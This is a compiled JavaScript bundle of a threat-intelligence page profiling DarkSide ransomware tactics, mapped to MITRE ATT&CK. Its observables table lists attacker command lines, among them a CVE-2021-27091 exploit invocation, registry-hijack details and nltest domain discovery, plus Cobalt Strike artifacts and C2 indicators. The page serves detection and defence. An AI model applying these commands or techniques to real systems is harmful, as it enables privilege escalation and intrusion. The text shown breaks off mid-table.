"use strict";(self.webpackChunkac3_threat_sightings=self.webpackChunkac3_threat_sightings||[]).push([[4232],{3248:function(e,t,a){var n=a(7294),r=a(7273);r.Z.initialize({startOnLoad:!0});t.Z=function(e){var t=e.chart;return(0,n.useEffect)((function(){r.Z.contentLoaded()}),[]),n.createElement("div",{className:"mermaid"},t)}},6824:function(e,t,a){a.r(t),a.d(t,{frontMatter:function(){return d},contentTitle:function(){return s},metadata:function(){return m},toc:function(){return k},default:function(){return p}});var n=a(7462),r=a(3366),l=(a(7294),a(4137)),i=a(3248),o=["components"],d={},s=void 0,m={unversionedId:"Sightings/Darkside_Ransomware",id:"Sightings/Darkside_Ransomware",isDocsHomePage:!1,title:"Darkside_Ransomware",description:"Overview",source:"@site/docs/03-Sightings/01-Darkside_Ransomware.md",sourceDirName:"03-Sightings",slug:"/Sightings/Darkside_Ransomware",permalink:"/ac3-threat-sightings/docs/Sightings/Darkside_Ransomware",tags:[],version:"current",sidebarPosition:1,frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Validating your schema",permalink:"/ac3-threat-sightings/docs/Getting Started/Validating your schema"},next:{title:"Jupyter_InfoStealer",permalink:"/ac3-threat-sightings/docs/Sightings/Jupyter_InfoStealer"}},k=[{value:"Overview",id:"overview",children:[{value:"References:",id:"references",children:[]},{value:"Threat Actor Activity",id:"threat-actor-activity",children:[]},{value:"Count of documented TTPs by Tactic",id:"count-of-documented-ttps-by-tactic",children:[]},{value:"Attack Flow",id:"attack-flow",children:[]}]},{value:"Tactics, Techniques and Procedures",id:"tactics-techniques-and-procedures",children:[]},{value:"Tactics, Techniques, Procedures, Observables and Notes",id:"tactics-techniques-procedures-observables-and-notes",children:[]},{value:"TTP Profiles with Observables",id:"ttp-profiles-with-observables",children:[{value:"DarkSide used <em>Valid Credentials</em> over <em>RDP</em> for Initial Access.",id:"darkside-used-valid-credentials-over-rdp-for-initial-access",children:[]},{value:"DarkSide used <em>Valid Credentials</em> over <em>RDP</em> for Lateral Movement.",id:"darkside-used-valid-credentials-over-rdp-for-lateral-movement",children:[]},{value:"DarkSide used <em>RDP</em> to download software tools for Command And Control.",id:"darkside-used-rdp-to-download-software-tools-for-command-and-control",children:[]},{value:"DarkSide used <em>RDP</em> to execute <em>CMD</em> for Execution.",id:"darkside-used-rdp-to-execute-cmd-for-execution",children:[]},{value:"DarkSide used <em>CMD</em> to execute a CVE-2021-27091 exploit for Privilege Escalation.",id:"darkside-used-cmd-to-execute-a-cve-2021-27091-exploit-for-privilege-escalation",children:[]},{value:"DarkSide used <em>nltest.exe</em> via interactive <em>PowerShell</em> for Discovery.",id:"darkside-used-nltestexe-via-interactive-powershell-for-discovery",children:[]},{value:"DarkSide used <em>Cobalt Strike</em> HTTP beacons for Command And Control.",id:"darkside-used-cobalt-strike-http-beacons-for-command-and-control",children:[]},{value:"DarkSide used <em>Windows Services</em> for Persistence.",id:"darkside-used-windows-services-for-persistence",children:[]},{value:"DarkSide used <em>Windows Services</em> to launch Cobalt Strike beacon PE file for Command And Control.",id:"darkside-used-windows-services-to-launch-cobalt-strike-beacon-pe-file-for-command-and-control",children:[]},{value:"DarkSide used process injection into <em>RUNDLL32</em> and <em>DLLHOST</em> to launch post-exploitation tasks for Defense Evasion.",id:"darkside-used-process-injection-into-rundll32-and-dllhost-to-launch-post-exploitation-tasks-for-defense-evasion",children:[]},{value:"DarkSide used <em>Cobalt Strike</em> to execute <em>BloodHound</em> in memory for Discovery.",id:"darkside-used-cobalt-strike-to-execute-bloodhound-in-memory-for-discovery",children:[]},{value:"DarkSide used <em>Windows Services</em> to launch <em>Cobalt Strike PowerShell</em> command via <em>CMD</em> for Command And Control.",id:"darkside-used-windows-services-to-launch-cobalt-strike-powershell-command-via-cmd-for-command-and-control",children:[]},{value:"DarkSide used <em>Cobalt Strike</em>  Named Pipes Impersonation for Privilege Escalation.",id:"darkside-used-cobalt-strike--named-pipes-impersonation-for-privilege-escalation",children:[]},{value:"DarkSide used <em>RDP</em> to execute a renamed copy of <em>rclone.exe</em> for Exfiltration.",id:"darkside-used-rdp-to-execute-a-renamed-copy-of-rcloneexe-for-exfiltration",children:[]},{value:"DarkSide used <em>Rundll32</em> to launch encryption for Impact.",id:"darkside-used-rundll32-to-launch-encryption-for-impact",children:[]}]}],u={toc:k};function p(e){var t=e.components,a=(0,r.Z)(e,o);return(0,l.kt)("wrapper",(0,n.Z)({},u,a,{components:t,mdxType:"MDXLayout"}),(0,l.kt)("h2",{id:"overview"},"Overview"),(0,l.kt)("p",null,"This Threat Sighting documents observed TTPs for DarkSide ransomware. This Threat Sighting is based on direct observation."),(0,l.kt)("p",null,"This document is a summary of the extracted TTPs. For full details please refer to the AC3 Threat Sighting (.yml file) at: ",(0,l.kt)("a",{parentName:"p",href:"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Darkside_Ransomware.yml"},"https://github.com/mcafee-enterprise/ac3-threat-sightings/blob/main/sightings/Sightings_Darkside_Ransomware.yml")),(0,l.kt)("p",null,"Author: Alejandro Houspanossian (@lekz86)"),(0,l.kt)("p",null,"Acknowledgements: @lekz86"),(0,l.kt)("h3",{id:"references"},"References:"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.mandiant.com/resources/shining-a-light-on-darkside-ransomware-operations"},"https://www.mandiant.com/resources/shining-a-light-on-darkside-ransomware-operations")),(0,l.kt)("li",{parentName:"ul"},(0,l.kt)("a",{parentName:"li",href:"https://www.trellix.com/en-us/threat-center/threat-reports/jan-2022.html"},"https://www.trellix.com/en-us/threat-center/threat-reports/jan-2022.html"))),(0,l.kt)("h3",{id:"threat-actor-activity"},"Threat Actor Activity"),(0,l.kt)("ul",null,(0,l.kt)("li",{parentName:"ul"},"DarkSide used ",(0,l.kt)("em",{parentName:"li"},"Valid Credentials")," over ",(0,l.kt)("em",{parentName:"li"},"RDP")," for Initial Access."),(0,l.kt)("li",{parentName:"ul"},"DarkSide used ",(0,l.kt)("em",{parentName:"li"},"Valid Credentials")," over ",(0,l.kt)("em",{parentName:"li"},"RDP")," for Lateral Movement."),(0,l.kt)("li",{parentName:"ul"},"DarkSide used ",(0,l.kt)("em",{parentName:"li"},"RDP")," to download software tools for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"DarkSide used ",(0,l.kt)("em",{parentName:"li"},"RDP")," to execute ",(0,l.kt)("em",{parentName:"li"},"CMD")," for Execution."),(0,l.kt)("li",{parentName:"ul"},"DarkSide used ",(0,l.kt)("em",{parentName:"li"},"CMD")," to execute a CVE-2021-27091 exploit for Privilege Escalation."),(0,l.kt)("li",{parentName:"ul"},"DarkSide used ",(0,l.kt)("em",{parentName:"li"},"nltest.exe")," via interactive ",(0,l.kt)("em",{parentName:"li"},"PowerShell")," for Discovery."),(0,l.kt)("li",{parentName:"ul"},"DarkSide used ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike")," HTTP beacons for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"DarkSide used ",(0,l.kt)("em",{parentName:"li"},"Windows Services")," for Persistence."),(0,l.kt)("li",{parentName:"ul"},"DarkSide used ",(0,l.kt)("em",{parentName:"li"},"Windows Services")," to launch Cobalt Strike beacon PE file for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"DarkSide used process injection into ",(0,l.kt)("em",{parentName:"li"},"RUNDLL32")," and ",(0,l.kt)("em",{parentName:"li"},"DLLHOST")," to launch post-exploitation tasks for Defense Evasion."),(0,l.kt)("li",{parentName:"ul"},"DarkSide used ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike")," to execute ",(0,l.kt)("em",{parentName:"li"},"BloodHound")," in memory for Discovery."),(0,l.kt)("li",{parentName:"ul"},"DarkSide used ",(0,l.kt)("em",{parentName:"li"},"Windows Services")," to launch ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike PowerShell")," command via ",(0,l.kt)("em",{parentName:"li"},"CMD")," for Command And Control."),(0,l.kt)("li",{parentName:"ul"},"DarkSide used ",(0,l.kt)("em",{parentName:"li"},"Cobalt Strike"),"  Named Pipes Impersonation for Privilege Escalation."),(0,l.kt)("li",{parentName:"ul"},"DarkSide used ",(0,l.kt)("em",{parentName:"li"},"RDP")," to execute a renamed copy of ",(0,l.kt)("em",{parentName:"li"},"rclone.exe")," for Exfiltration."),(0,l.kt)("li",{parentName:"ul"},"DarkSide used ",(0,l.kt)("em",{parentName:"li"},"Rundll32")," to launch encryption for Impact.")),(0,l.kt)("h3",{id:"count-of-documented-ttps-by-tactic"},"Count of documented TTPs by Tactic"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"# Documented TTPs"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Exfiltration"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"+ (1)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Privilege Escalation"),(0,l.kt)("td",{parentName:"tr",align:null},"++ (2)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"++ (2)")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"++++ (4)")))),(0,l.kt)("h3",{id:"attack-flow"},"Attack Flow"),(0,l.kt)("p",null,"The chart below shows a graphical representation of the attack flow."),(0,l.kt)(i.Z,{chart:"\ngraph TD\nIA[Initial Access] --\x3e | _Valid Credentials_ over _RDP_| IA[Initial Access]\nIA[Initial Access] --\x3e | _Valid Credentials_ over _RDP_| LatM[Lateral Movement]\nLatM[Lateral Movement] --\x3e | _RDP_ to download software tools| C2[Command And Control]\nLatM[Lateral Movement] --\x3e | _RDP_ to execute _CMD_| EXE[Execution]\nEXE[Execution] --\x3e | _CMD_ to execute a CVE-2021-27091 exploit| PE[Privilege Escalation]\nC2[Command And Control] --\x3e | _nltest.exe_ via interactive _PowerShell_| D[Discovery]\nEXE[Execution] --\x3e | _Cobalt Strike_ HTTP beacons| C2[Command And Control]\nEXE[Execution] --\x3e | _Windows Services_| PER[Persistence]\nPER[Persistence] --\x3e | _Windows Services_ to launch Cobalt Strike beacon PE file| C2[Command And Control]\nC2[Command And Control] --\x3e | process injection into _RUNDLL32_ and _DLLHOST_ to launch post-exploitation tasks| DE[Defense Evasion]\nC2[Command And Control] --\x3e | _Cobalt Strike_ to execute _BloodHound_ in memory| D[Discovery]\nPER[Persistence] --\x3e | _Windows Services_ to launch _Cobalt Strike PowerShell_ command via _CMD_| C2[Command And Control]\nC2[Command And Control] --\x3e | _Cobalt Strike_  Named Pipes Impersonation| PE[Privilege Escalation]\nLatM[Lateral Movement] --\x3e | _RDP_ to execute a renamed copy of _rclone.exe_| EXFIL[Exfiltration]\nDE[Defense Evasion] --\x3e | _Rundll32_ to launch encryption| IMP[Impact]\n",mdxType:"Mermaid"}),(0,l.kt)("h2",{id:"tactics-techniques-and-procedures"},"Tactics, Techniques and Procedures"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1021.001 - Remote Services: Remote Desktop Protocol",(0,l.kt)("br",null),"T1078 - Valid Accounts"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Valid Credentials")," over ",(0,l.kt)("em",{parentName:"td"},"RDP")," for Initial Access.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,l.kt)("td",{parentName:"tr",align:null},"T1021.001 - Remote Services: Remote Desktop Protocol",(0,l.kt)("br",null),"T1078 - Valid Accounts"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Valid Credentials")," over ",(0,l.kt)("em",{parentName:"td"},"RDP")," for Lateral Movement.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1105 - Ingress Tool Transfer",(0,l.kt)("br",null),"T1021.001 - Remote Services: Remote Desktop Protocol"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to download software tools for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003 - Command and Scripting Interpreter: Windows Command Shell"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to execute ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Execution.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Privilege Escalation"),(0,l.kt)("td",{parentName:"tr",align:null},"T1203 - Exploitation for Client Execution",(0,l.kt)("br",null),"T1112 - Modify Registry",(0,l.kt)("br",null),"T1543.003 - Create or Modify System Process: Windows Service"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"CMD")," to execute a CVE-2021-27091 exploit for Privilege Escalation.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001 - Command and Scripting Interpreter: PowerShell",(0,l.kt)("br",null),"T1018 - Remote System Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"nltest.exe")," via interactive ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.004 - Application Layer Protocol: Web Protocols"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," HTTP beacons for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1543.003 - Create or Modify System Process: Windows Service"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Windows Services")," for Persistence.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1569.002 - System Services: Service Execution",(0,l.kt)("br",null),"T1071 - Application Layer Protocol"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Windows Services")," to launch Cobalt Strike beacon PE file for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Defense Evasion"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011 - Signed Binary Proxy Execution: Rundll32",(0,l.kt)("br",null),"T1055.012 - Process Injection: Process Hollowing"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used process injection into ",(0,l.kt)("em",{parentName:"td"},"RUNDLL32")," and ",(0,l.kt)("em",{parentName:"td"},"DLLHOST")," to launch post-exploitation tasks for Defense Evasion.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071 - Application Layer Protocol",(0,l.kt)("br",null),"T1018 - Remote System Discovery",(0,l.kt)("br",null),"T1046 - Network Service Scanning",(0,l.kt)("br",null),"T1560 - Archive Collected Data"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," to execute ",(0,l.kt)("em",{parentName:"td"},"BloodHound")," in memory for Discovery.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1569.002 - System Services: Service Execution",(0,l.kt)("br",null),"T1059.001 - Command and Scripting Interpreter: PowerShell",(0,l.kt)("br",null),"T1140 - Deobfuscate/Decode Files or Information"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Windows Services")," to launch ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike PowerShell")," command via ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Command And Control.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Privilege Escalation"),(0,l.kt)("td",{parentName:"tr",align:null},"T1134 - Access Token Manipulation"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike"),"  Named Pipes Impersonation for Privilege Escalation.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Exfiltration"),(0,l.kt)("td",{parentName:"tr",align:null},"T1036 - Masquerading",(0,l.kt)("br",null),"T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to execute a renamed copy of ",(0,l.kt)("em",{parentName:"td"},"rclone.exe")," for Exfiltration.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"T1218.011 - Signed Binary Proxy Execution: Rundll32",(0,l.kt)("br",null),"T1486 - Data Encrypted for Impact"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Rundll32")," to launch encryption for Impact.")))),(0,l.kt)("h2",{id:"tactics-techniques-procedures-observables-and-notes"},"Tactics, Techniques, Procedures, Observables and Notes"),(0,l.kt)("table",null,(0,l.kt)("thead",{parentName:"table"},(0,l.kt)("tr",{parentName:"thead"},(0,l.kt)("th",{parentName:"tr",align:null},"Tactic"),(0,l.kt)("th",{parentName:"tr",align:null},"Techniques"),(0,l.kt)("th",{parentName:"tr",align:null},"Procedure"),(0,l.kt)("th",{parentName:"tr",align:null},"Observables"),(0,l.kt)("th",{parentName:"tr",align:null},"Notes"))),(0,l.kt)("tbody",{parentName:"table"},(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Initial Access"),(0,l.kt)("td",{parentName:"tr",align:null},"T1021.001",(0,l.kt)("br",null),"T1078"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Valid Credentials")," over ",(0,l.kt)("em",{parentName:"td"},"RDP")," for Initial Access."),(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},"- Initial Access was unclear during the time of this investigation.",(0,l.kt)("br",null),"- After some time, journalists reported Initial Access via valid credentials acquired on dark web.",(0,l.kt)("br",null),"- ",(0,l.kt)("a",{parentName:"td",href:"https://www.newsweek.com/colonial-pipeline-hackers-used-unprotected-vpn-access-network-report-1597842"},"https://www.newsweek.com/colonial-pipeline-hackers-used-unprotected-vpn-access-network-report-1597842"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Lateral Movement"),(0,l.kt)("td",{parentName:"tr",align:null},"T1021.001",(0,l.kt)("br",null),"T1078"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Valid Credentials")," over ",(0,l.kt)("em",{parentName:"td"},"RDP")," for Lateral Movement."),(0,l.kt)("td",{parentName:"tr",align:null}),(0,l.kt)("td",{parentName:"tr",align:null},"- Threat actor loged to multiple systems.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1105",(0,l.kt)("br",null),"T1021.001"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to download software tools for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\Music\\\\rembemrO.exe"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\Music\\\\perfect_x64.exe"),(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\Music\\\\perfect_x64.exe")),(0,l.kt)("td",{parentName:"tr",align:null},"- Darkside was reported to have used ",(0,l.kt)("em",{parentName:"td"},"C:","\\","Users","\\","#{user}","\\","Music","\\")," folder in other engagements.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Execution"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.003"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"RDP")," to execute ",(0,l.kt)("em",{parentName:"td"},"CMD")," for Execution."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Windows\\\\System32\\\\cmd.exe")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Privilege Escalation"),(0,l.kt)("td",{parentName:"tr",align:null},"T1203",(0,l.kt)("br",null),"T1112",(0,l.kt)("br",null),"T1543.003"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"CMD")," to execute a CVE-2021-27091 exploit for Privilege Escalation."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"perfect_x64.exe -k Dnscache -c cmd -I"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"cmd"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"File Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"C:\\\\Users\\\\#{user}\\\\AppData\\\\Local\\\\Temp\\\\performance_15820_14496_117.dll"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"RegValue Created"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"HKLM\\\\SYSTEM\\\\CONTROLSET001\\\\SERVICES\\\\DNSCACHE\\\\PERFORMANCE")),(0,l.kt)("td",{parentName:"tr",align:null},"- CVE-2021-27091 in a nutshell: a user without privileges can modify the Windows Registry settings of DNSCACHE and RpcEptMapper Windows Services to achieve arbitrary code excution with High Privileges.",(0,l.kt)("br",null),"- ",(0,l.kt)("a",{parentName:"td",href:"https://itm4n.github.io/windows-registry-rpceptmapper-eop/"},"https://itm4n.github.io/windows-registry-rpceptmapper-eop/"),(0,l.kt)("br",null),"- ",(0,l.kt)("a",{parentName:"td",href:"https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-27091"},"https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2021-27091"),(0,l.kt)("br",null),"- The PERFORMANCE subkey is intended to attacht a porformance monitor to the Windows service.",(0,l.kt)("br",null),"- Instead of a perf monitor DLL, the exploit provides a malicious DLL for arbitrary code execution.",(0,l.kt)("br",null),"- Finally, to actually get the arbitrary code to run, only need to call the performance counters.")),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Discovery"),(0,l.kt)("td",{parentName:"tr",align:null},"T1059.001",(0,l.kt)("br",null),"T1018"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"nltest.exe")," via interactive ",(0,l.kt)("em",{parentName:"td"},"PowerShell")," for Discovery."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"c:\\\\windows\\\\syswow64\\\\windowspowershell\\\\v1.0\\\\powershell.exe"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"c:\\\\windows\\\\system32\\\\nltest.exe /dclist:yourcompany.com")),(0,l.kt)("td",{parentName:"tr",align:null},"- ",(0,l.kt)("em",{parentName:"td"},"Nltest")," is a Windows command-line utility used to list domain controllers and enumerate domain trusts.",(0,l.kt)("br",null),"- ",(0,l.kt)("a",{parentName:"td",href:"https://attack.mitre.org/software/S0359/"},"https://attack.mitre.org/software/S0359/"))),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1071.004"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Cobalt Strike")," HTTP beacons for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"13[.]107.246.41"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"Network Accessed"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"assets[.]outlook.com")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Persistence"),(0,l.kt)("td",{parentName:"tr",align:null},"T1543.003"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Windows Services")," for Persistence."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"n/d")),(0,l.kt)("td",{parentName:"tr",align:null})),(0,l.kt)("tr",{parentName:"tbody"},(0,l.kt)("td",{parentName:"tr",align:null},"Command And Control"),(0,l.kt)("td",{parentName:"tr",align:null},"T1569.002",(0,l.kt)("br",null),"T1071"),(0,l.kt)("td",{parentName:"tr",align:null},"DarkSide used ",(0,l.kt)("em",{parentName:"td"},"Windows Services")," to launch Cobalt Strike beacon PE file for Command And Control."),(0,l.kt)("td",{parentName:"tr",align:null},(0,l.kt)("em",{parentName:"td"},"Process Created"),": ",(0,l.kt)("br",null),"- ",(0,l.kt)("inlineCode",{parentName:"td"},"\\\\\\\\#{IP}\\\\ADMIN$\\\\e10a2f3.exe"),(0,l.kt)("br",null),(0,l.kt)("em",{parentName:"td"},"NamedPipe Connected"),": ",(0,l.kt)("inlineCode",{parentName:"td"},"\\\\\\\\.\\\\pipe\\\\MSSE-5861-server")),(0,l.kt)("td",{parentName:"tr",align:null},"- ADMIN$ is one of the default administrative network shares in Windows.",(0,l.kt)("br",null),"- ADMIN$ is hidden, and links to C:","\\","Windows.",(0,l.kt)("br",null),"- ADMIN$ is typically used to deploy software remotely.",(0,l.kt)("br",null),"- ","\\","\\","#{IP}","\\","ADMIN$","\\"," is a probable indicator of remote execution.",(0,l.kt)("br",null),"- The filename pattern ","[a-z0-9]","{7}.exe is known for Cobalt Strike PE beacons.",(0,l.kt)("br",null),"- NamedPipes are an inter-process communication mechanism on Windows.",(0,l.kt)("br",null),"- NamedPipe traffic that goes host-to-host is encapsulated within the SMB 